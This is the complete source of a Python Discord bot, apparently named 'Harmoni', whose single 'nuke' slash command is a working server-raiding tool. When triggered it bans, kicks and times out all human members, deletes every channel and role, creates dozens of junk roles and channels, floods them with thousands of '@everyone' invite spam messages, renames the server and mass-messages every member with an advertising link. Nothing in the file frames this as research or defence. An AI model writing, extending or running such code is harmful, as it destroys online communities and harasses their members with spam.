import discord
from discord.ext import commands
from discord import app_commands
import json
import pyfiglet
from termcolor import colored
import datetime
import asyncio

print(colored(pyfiglet.figlet_format('Harmoni', font='slant'), 'green'))

with open('config.json') as config_file:
    config = json.load(config_file)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(colored('Bot is online!', 'blue'))
    await bot.change_presence(activity=discord.Game(name="gg/harmoni"))
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands")
    except Exception as e:
        print(e)

async def command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    embed = discord.Embed(description="An error occurred while executing the command.", color=discord.Color.red())
    if interaction.response.is_done():
        await interaction.followup.send(embed=embed, ephemeral=True)
    else:
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="nuke", description="Execute a series of destructive actions")
async def nuke(interaction: discord.Interaction):
    if not interaction.response.is_done():
        await interaction.response.send_message("Nuke command initiated!", ephemeral=True)
    
    members = [member async for member in interaction.guild.fetch_members(limit=None)]
    
    tasks = [
        ban_kick_timeout_members(interaction, members),
        delete_channels(interaction),
        delete_roles(interaction),
        create_roles(interaction),
        create_channels_and_spam(interaction),
        change_server_name(interaction),
        create_and_spam_embed_channels(interaction),
        dm_all_members(interaction, members)
    ]

    await asyncio.gather(*tasks)

async def ban_kick_timeout_members(interaction, members):
    for member in members:
        if not member.bot:
            try:
                await member.ban(reason="discord.gg/harmoni")
                await member.kick(reason="discord.gg/harmoni")
                await member.timeout(datetime.timedelta(seconds=4000), reason="discord.gg/harmoni")
            except Exception as e:
                print(f"Error with member {member}: {e}")

async def delete_channels(interaction):
    for channel in interaction.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Error deleting channel {channel}: {e}")

async def delete_roles(interaction):
    for role in interaction.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except Exception as e:
                print(f"Error deleting role {role}: {e}")

async def create_roles(interaction):
    for _ in range(50):
        try:
            await interaction.guild.create_role(name="Harmoni")
        except Exception as e:
            print(f"Error creating role: {e}")

async def create_channels_and_spam(interaction):
    for _ in range(50):
        try:
            channel = await interaction.guild.create_text_channel(name="harmoni")
            for _ in range(100):
                await channel.send("@everyone https://discord.gg/harmoni")
        except Exception as e:
            print(f"Error creating/spamming channel: {e}")

async def change_server_name(interaction):
    try:
        await interaction.guild.edit(name="Harmoni Server")
    except Exception as e:
        print(f"Error changing server name: {e}")

async def create_and_spam_embed_channels(interaction):
    try:
        embed = discord.Embed(
            title="HMPY",
            description="Visit discord.gg/harmoni",
            color=discord.Color.red()
        )
        for _ in range(10):
            channel = await interaction.guild.create_text_channel(name="harmoni-dchannels")
            await channel.send(embed=embed)
            for _ in range(100):
                await channel.send("@everyone https://discord.gg/harmoni")
    except Exception as e:
        print(f"Error creating/spamming embed channels: {e}")

async def dm_all_members(interaction, members):
    for member in members:
        if not member.bot:
            try:
                await member.send("Hello! https://discord.gg/harmoni")
                await asyncio.sleep(1)
            except discord.Forbidden:
                print(f"Could not DM {member}: DMs are closed.")
            except Exception as e:
                print(f"Error sending DM to {member}: {e}")

bot.tree.error(command_error)
bot.run(config["token"])